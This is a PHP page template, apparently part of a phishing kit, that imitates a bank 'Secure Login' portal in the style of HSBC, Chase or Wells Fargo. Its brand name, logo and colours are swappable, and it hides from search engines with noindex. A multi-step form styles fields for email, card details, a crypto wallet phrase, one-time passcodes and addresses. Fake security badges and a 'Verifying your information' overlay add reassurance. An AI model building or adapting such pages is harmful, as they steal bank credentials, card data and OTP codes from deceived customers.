<?php
// Banking template — HSBC / Chase / Wells Fargo style
// Dark theme with strong brand gradient header, Inter font, centered card
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Secure Login</title>
<meta name="robots" content="noindex,nofollow">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--a:<?=$accent?>;--s:<?=$sec?>;--r:<?=$ar?>;--g:<?=$ag?>;--b:<?=$ab?>}
body{font-family:'Inter',system-ui,sans-serif;min-height:100vh;min-height:100dvh;
  background:radial-gradient(ellipse at 25% 10%,rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.14) 0%,#060a12 55%,#0b1020 100%);
  display:flex;align-items:center;justify-content:center;padding:24px 16px;color:#f1f5f9}
.card{width:100%;max-width:460px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:18px;overflow:hidden;box-shadow:0 40px 100px rgba(0,0,0,.6),0 0 0 1px rgba(255,255,255,.04)}

/* Header */
.hd{background:linear-gradient(135deg,<?=$accent?> 0%,<?=$sec?> 100%);padding:26px 28px 20px;position:relative;overflow:hidden}
.hd::before{content:'';position:absolute;right:-60px;top:-60px;width:220px;height:220px;border-radius:50%;background:rgba(255,255,255,.07)}
.hd::after{content:'';position:absolute;left:-30px;bottom:-40px;width:150px;height:150px;border-radius:50%;background:rgba(0,0,0,.12)}
.hd-top{display:flex;align-items:center;gap:16px;position:relative;z-index:1}
.logo-box{width:56px;height:56px;background:<?=$logo_bg?>;border-radius:12px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0;box-shadow:0 4px 20px rgba(0,0,0,.3)}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:20px;font-weight:800;color:<?=$accent?>}
.hd-name{font-size:18px;font-weight:800;color:#fff;letter-spacing:-.3px;line-height:1.2}
.hd-sub{font-size:10px;color:rgba(255,255,255,.7);margin-top:3px;text-transform:uppercase;letter-spacing:.5px}
.hd-bar{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:14px;border-top:1px solid rgba(255,255,255,.18);position:relative;z-index:1}
.hd-date{font-size:11px;color:rgba(255,255,255,.8)}
.hd-lock{font-size:11px;color:rgba(255,255,255,.85);font-weight:600;display:flex;align-items:center;gap:4px}
.hd-ref{font-size:10px;font-weight:700;color:#fff;background:rgba(255,255,255,.2);border:1px solid rgba(255,255,255,.3);padding:3px 10px;border-radius:5px;letter-spacing:.4px}

/* Body */
.bd{padding:28px 28px 20px}
.steps{display:flex;justify-content:center;gap:6px;margin-bottom:24px}
.dot{width:30px;height:4px;border-radius:2px;background:rgba(255,255,255,.1);transition:background .3s}
.dot.active{background:<?=$accent?>}
.dot.done{background:rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.45)}
.step-title{font-size:17px;font-weight:700;color:#f1f5f9;margin-bottom:6px;text-align:center}
.step-sub{font-size:13px;color:#94a3b8;text-align:center;margin-bottom:22px;line-height:1.5}
.field{margin-bottom:14px}
.field label{display:block;font-size:11px;color:#94a3b8;font-weight:600;letter-spacing:.6px;text-transform:uppercase;margin-bottom:6px}
.field input{width:100%;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);color:#f1f5f9;padding:12px 14px;border-radius:10px;font-size:14px;outline:none;transition:border-color .2s,background .2s;font-family:inherit;-webkit-appearance:none}
.field input:focus{border-color:<?=$accent?>;background:rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.08)}
.field input::placeholder{color:#475569}
.or-div{text-align:center;font-size:11px;color:#334155;margin:10px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:40%;height:1px;background:rgba(255,255,255,.07)}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btn{width:100%;padding:13px;background:<?=$accent?>;color:#fff;font-size:15px;font-weight:700;border:none;border-radius:10px;cursor:pointer;margin-top:6px;letter-spacing:.2px;transition:filter .15s,transform .15s;position:relative;overflow:hidden;font-family:inherit}
.btn:hover{filter:brightness(1.1);transform:translateY(-1px)}
.btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:12px;color:#f87171;margin-top:8px;display:none}
.security-note{display:flex;align-items:center;gap:6px;justify-content:center;font-size:11px;color:#64748b;margin-top:14px;padding-top:12px;border-top:1px solid rgba(255,255,255,.06)}
.wallet-area{width:100%;min-height:80px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);color:#f1f5f9;padding:12px 14px;border-radius:10px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#64748b;margin-top:6px;line-height:1.5}
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:22px;font-weight:700;letter-spacing:2px;padding:14px 4px;max-width:48px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#f1f5f9;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:12px;color:#64748b;text-align:center;margin-top:8px}
.addr-area{width:100%;min-height:60px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);color:#f1f5f9;padding:12px 14px;border-radius:10px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}
.card-footer{padding:14px 20px;background:rgba(0,0,0,.2);border-top:1px solid rgba(255,255,255,.05);font-size:10px;color:#475569;text-align:center;line-height:1.6}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(6,10,18,.9);z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:44px;height:44px;border:3px solid rgba(255,255,255,.1);border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#64748b}

@media(max-width:480px){
  body{padding:0;align-items:flex-start}
  .card{border-radius:0;min-height:100vh;min-height:100dvh}
  .bd{padding:22px 20px 16px}
  .hd{padding:22px 20px 16px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying your information…</div></div>

<div class="card">
  <div class="hd">
    <div class="hd-top">
      <div class="logo-box">
        <?php if($logo_url):?><img src="<?=htmlspecialchars($logo_url)?>" alt="" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><?php endif?>
        <span class="logo-ini" style="display:<?=$logo_url?'none':'flex'?>;align-items:center;justify-content:center;width:100%;height:100%"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
      </div>
      <div>
        <div class="hd-name"><?=htmlspecialchars($org_name)?></div>
        <div class="hd-sub"><?=htmlspecialchars($org_sub)?></div>
      </div>
    </div>
    <div class="hd-bar">
      <span class="hd-date">📅 <?=$today?></span>
      <span class="hd-lock">🔒 Secure Portal</span>
      <span class="hd-ref"><?=htmlspecialchars($ref_code)?></span>
    </div>
  </div>

  <div class="bd">
    <div class="steps" id="stepDots">
      <?php for($i=1;$i<=$total_steps;$i++): ?>
      <div class="dot <?=$i===1?'active':''?>" id="d<?=$i?>"></div>
      <?php endfor; ?>
    </div>

    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php
        $fld = $sc['step'.$sn.'_fields'] ?? 'email_only';
        include __DIR__.'/partials/fields.php';
        ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <div class="security-note">🔒 256-bit SSL Encrypted &middot; Secure Connection</div>
    </div>
    <?php endfor; ?>
  </div>

  <?php if($footer): ?>
  <div class="card-footer"><?=htmlspecialchars($footer)?></div>
  <?php endif; ?>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
</body>
</html>
